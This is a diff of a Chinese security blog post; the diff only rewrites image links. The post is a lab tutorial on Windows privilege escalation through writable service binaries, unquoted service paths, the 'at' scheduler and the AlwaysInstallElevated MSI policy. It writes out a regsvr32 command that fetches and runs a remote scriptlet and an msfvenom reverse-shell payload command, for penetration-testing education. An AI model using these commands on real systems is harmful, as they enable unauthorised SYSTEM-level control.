@@ -113,7 +113,10 @@
 <p>在软件注册服务的时候，会在注册表中创建几个项，该项的注册表路径如下：</p>
 <p><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</code></p>
 <p>我选择一个名为<code>“gwservice”</code>的项，查看该项下的所有值：</p>
-<p><img src="../../../static/images/28c82c82-4f5f-11ec-9e53-00d861bf4abb.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/28c82c82-4f5f-11ec-9e53-00d861bf4abb.png" alt=""  />
+  </p></p>
 <p>其中有一个ImagePath的名称，它的值是：</p>
 <p><code>C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe</code></p>
 <p>可见它是一个VPN相关的服务，下面有两种提权可能：</p>
@@ -122,30 +125,57 @@
 <li>2.若这个ImagePath所指向的目录权限可控，那么我们也可以替换<code>gwservice.exe</code>，从而当服务启动的时候，就能够执行我们的应用程序（木马）。</li>
 </ul>
 <p>但是很遗憾，第1种不行：</p>
-<p><img src="../../../static/images/2901bf24-4f5f-11ec-be22-00d861bf4abb.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2901bf24-4f5f-11ec-be22-00d861bf4abb.png" alt=""  />
+  </p></p>
 <p>当前用户没有足够的权限。</p>
 <p>尝试第二种方法，使用“icacls”命令查看目录权限：</p>
-<p><img src="../../../static/images/2942f94e-4f5f-11ec-99bc-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2942f94e-4f5f-11ec-99bc-00d861bf4abb.png" alt=""  />
+  </p>
 惊喜的发现，<code>“Everyone”</code>用户可以读写该目录下所有文件。</p>
 <p>Ps:Everyone代指当前主机下所有用户，包含（Guest）</p>
 <h3 id="提权过程">提权过程</h3>
 <p>首先，我启用了win7的Guest用户，使用Guest用户登录这台机器：</p>
-<p><img src="../../../static/images/297e7e1a-4f5f-11ec-af7b-00d861bf4abb.png" alt="">
-<img src="../../../static/images/29b1286a-4f5f-11ec-93d3-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/297e7e1a-4f5f-11ec-af7b-00d861bf4abb.png" alt=""  />
+  </p>
+<p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/29b1286a-4f5f-11ec-93d3-00d861bf4abb.png" alt=""  />
+  </p>
 Ping命令都不让用，限制很死。</p>
 <p>使用msf生成一个木马：</p>
-<p><img src="../../../static/images/29f12ac8-4f5f-11ec-aa05-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/29f12ac8-4f5f-11ec-aa05-00d861bf4abb.png" alt=""  />
+  </p>
 将木马替换为gwservice.exe</p>
-<p><img src="../../../static/images/2a32c9ce-4f5f-11ec-b4b8-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2a32c9ce-4f5f-11ec-b4b8-00d861bf4abb.png" alt=""  />
+  </p>
 先执行测试一下，能否获得Guest的session：</p>
-<p><img src="../../../static/images/2a70111c-4f5f-11ec-bef8-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2a70111c-4f5f-11ec-bef8-00d861bf4abb.png" alt=""  />
+  </p>
 获得会话后，注销（或重启）Guest用户，登录管理员用户，获得SYSTEM权限：</p>
-<p><img src="../../../static/images/2ab054b6-4f5f-11ec-90e5-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2ab054b6-4f5f-11ec-90e5-00d861bf4abb.png" alt=""  />
+  </p>
 提权情况还是要根据服务器本身的环境，我总结的这些方法就是为了优先采用这些方式，而不是直接突突搞EXP ……</p>
 <h2 id="0x02-模糊路径提权">0x02 模糊路径提权</h2>
 <p>在上一篇中，我们继续基于<code>Gateway Session Service</code>这个服务进行分析其他提权方法：</p>
 <p><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</code></p>
-<p><img src="../../../static/images/2af42196-4f5f-11ec-b362-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2af42196-4f5f-11ec-b362-00d861bf4abb.png" alt=""  />
+  </p>
 其中有一个ImagePath的名称，它的值是：</p>
 <p><code>C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe</code></p>
 <p>当服务启动时，将会读取这个ImagePath的值，我们无法更改这个值，但是可以通过Windows的特性来巧妙提权。
@@ -165,17 +195,29 @@ Ping命令都不让用，限制很死。</p>
 <p><code>“C:\Program Files (x86)\server process\ssl\service.exe”</code></p>
 <p>加了引号的路径，则不会出现这种问题。</p>
 <p>可以看看几个比较符合安全规范的例子：</p>
-<p><img src="../../../static/images/2b613d8a-4f5f-11ec-a638-00d861bf4abb.png" alt="">
-<img src="../../../static/images/2b9c0370-4f5f-11ec-9d8d-00d861bf4abb.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2b613d8a-4f5f-11ec-a638-00d861bf4abb.png" alt=""  />
+  </p>
+<p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2b9c0370-4f5f-11ec-9d8d-00d861bf4abb.png" alt=""  />
+  </p></p>
 <p>ImagePath有的会使用系统环境变量，在这里的<code>“%systemroot%”</code>指的是<code>“C:\Windows\”</code>,普通用户时没办法操作这个环境变量的，而且也没办法修改<code>“C:\Windows\”</code>中的文件，因此看起来还是相对比较安全。</p>
 <p>客观因素：由于<code>“C:\Program File(x86)”</code>普通用户（比User组权限还低的用户）也无法写入文件，所以本篇文章只是做研究范畴讨论，因为每个服务器的情况不同，安装的软件路径也不同，利用空间还是很大的。</p>
 <h3 id="提权过程-1">提权过程</h3>
 <p>生成木马：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>~# msfpc windows exe
 </span></span></code></pre></div><p>接下来的操作还是使用之前的木马，直接将木马命名为<code>“Program.exe”</code>放在<code>“C:\Program.exe”</code>，然后重启主机。</p>
-<p><img src="../../../static/images/2bd80f78-4f5f-11ec-a67c-00d861bf4abb.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2bd80f78-4f5f-11ec-a67c-00d861bf4abb.png" alt=""  />
+  </p></p>
 <p>此时我们得到的会话已经时“SYSTEM”权限。</p>
-<p><img src="../../../static/images/2c217500-4f5f-11ec-836e-00d861bf4abb.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2c217500-4f5f-11ec-836e-00d861bf4abb.png" alt=""  />
+  </p></p>
 <h2 id="0x03-定时任务计划提权">0x03 定时任务计划提权</h2>
 <p>本篇内容可能比较旧，且方法比较老套。局限性较强、操作非常简单。</p>
 <p>在Windows2000、Windows 2003、Windows XP这三类系统中，我们可以轻松将Administrators组下的用户权限提升到SYSTEM。</p>
@@ -189,19 +231,34 @@ Ping命令都不让用，限制很死。</p>
 </span></span></code></pre></div><p>验证是否以SYSTEM权限启动</p>
 <p>使用“at 10:56PM /interactive calc.exe”命令创建一个定时任务计划。</p>
 <p>参考文档：https://support.microsoft.com/zh-cn/help/313565/how-to-use-the-at-command-to-schedule-tasks</p>
-<p><img src="../../../static/images/2c79c872-4f5f-11ec-9243-00d861bf4abb.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2c79c872-4f5f-11ec-9243-00d861bf4abb.png" alt=""  />
+  </p></p>
 <h3 id="提权过程-2">提权过程</h3>
 <p>可以采用Regsvr32一条命令上线，使用MSF的“multi/script/web_delivery”模块，我的配置如下：</p>
-<p><img src="../../../static/images/2cba810a-4f5f-11ec-a375-00d861bf4abb.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2cba810a-4f5f-11ec-a375-00d861bf4abb.png" alt=""  />
+  </p></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoXL7Q8JccV.sct scrobj.dll
 </span></span></code></pre></div><p>就是需要执行的命令，需要将它加入定时任务计划中去。</p>
 <p>命令：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>at 11:16PM <span style="color:#ae81ff">\i</span>nteractive regsvr32 /s /n /u /i:http://192.168.117.132:8080/EixyqoXL7Q8JccV.sct scrobj.dll
-</span></span></code></pre></div><p><img src="../../../static/images/2d010148-4f5f-11ec-a79d-00d861bf4abb.png" alt="">
+</span></span></code></pre></div><p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2d010148-4f5f-11ec-a79d-00d861bf4abb.png" alt=""  />
+  </p>
 但是我发现regsvr32会报错。</p>
 <p>只能将木马落地到服务器（Win 2003 SP1）上了，还是采用之前生成的木马。</p>
-<p><img src="../../../static/images/2d429ffe-4f5f-11ec-9d8f-00d861bf4abb.png" alt="">
-<img src="../../../static/images/2d8178fa-4f5f-11ec-98dc-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2d429ffe-4f5f-11ec-9d8f-00d861bf4abb.png" alt=""  />
+  </p>
+<p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2d8178fa-4f5f-11ec-98dc-00d861bf4abb.png" alt=""  />
+  </p>
 此时我们得到的会话已经是“SYSTEM”权限。</p>
 <h2 id="0x04-msi安装策略提权">0x04 MSI安装策略提权</h2>
 <p>自从Windows 2000起，在安装MSI安装包的时候，会以SYSTEM权限运行。前提是组策略启用了“Allow install with elevated privileges”。</p>
@@ -211,21 +268,33 @@ Ping命令都不让用，限制很死。</p>
 <p>如果禁用或未配置此设置，当安装的程序不是管理员分发或提供的程序时，系统将会应用当前用户的权限。</p>
 <p>注意:“计算机配置”和“用户配置”文件夹中均包括此设置。若要使该设置生效，必须在两个文件夹中都启用它。</p>
 <p>注意:熟练的用户可以利用该设置授予的权限来更改其特权并获得对受限文件和文件夹的永久访问权。请注意，这个设置的“用户配置”版本不一定安全。</p>
-<p><img src="../../../static/images/2dc4dece-4f5f-11ec-9e11-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2dc4dece-4f5f-11ec-9e11-00d861bf4abb.png" alt=""  />
+  </p>
 默认情况下是<code>“Not Configured”</code>，如果是<code>“Enabled”</code>，可以直接利用于特权提升。</p>
 <p>这个配置项对应的注册表路径为：</p>
 <ul>
 <li>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\windows\Installer</li>
 <li>HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
 </ul>
-<p><img src="../../../static/images/2e038ef8-4f5f-11ec-825b-00d861bf4abb.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2e038ef8-4f5f-11ec-825b-00d861bf4abb.png" alt=""  />
+  </p></p>
 <h3 id="提权过程-3">提权过程</h3>
 <p>首先我们需要生成一个MSI木马：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.117.134 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f msi-nouac -o lask.msi
 </span></span></code></pre></div><p>开启一个监听：</p>
-<p><img src="../../../static/images/2e448250-4f5f-11ec-b1cb-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2e448250-4f5f-11ec-b1cb-00d861bf4abb.png" alt=""  />
+  </p>
 将lask.msi复制到Windows中，运行后即可获得SYSTEM权限。</p>
-<p><img src="../../../static/images/2e8e68ca-4f5f-11ec-856a-00d861bf4abb.png" alt="">
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2e8e68ca-4f5f-11ec-856a-00d861bf4abb.png" alt=""  />
+  </p>
 参考学习：https://www.anquanke.com/post/id/87</p>
 <h2 id="0x05-dll劫持提权">0x05 DLL劫持提权</h2>
 <p>之前写过关于DLL劫持的几篇文章，涵盖了原理、分析过程、技巧。</p>
@@ -260,7 +329,10 @@ Ping命令都不让用，限制很死。</p>
 我暂时关闭了发帖权限、分享权限； 因为我有一个小的朋友圈，经常讨论一些技术，会在这里用评论交流。</p>
 <p>关闭发帖权限是因为不指望加入的朋友分享，我发表的都是我的收获，不想因为别人影响自己的东西，妨碍搜索和温习。</p>
 <p>扫码可免费加入：</p>
-<p><img src="../../../static/images/2ed458f8-4f5f-11ec-92a8-00d861bf4abb.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2ed458f8-4f5f-11ec-92a8-00d861bf4abb.png" alt=""  />
+  </p></p>
 
 </div>
 <div class="container">
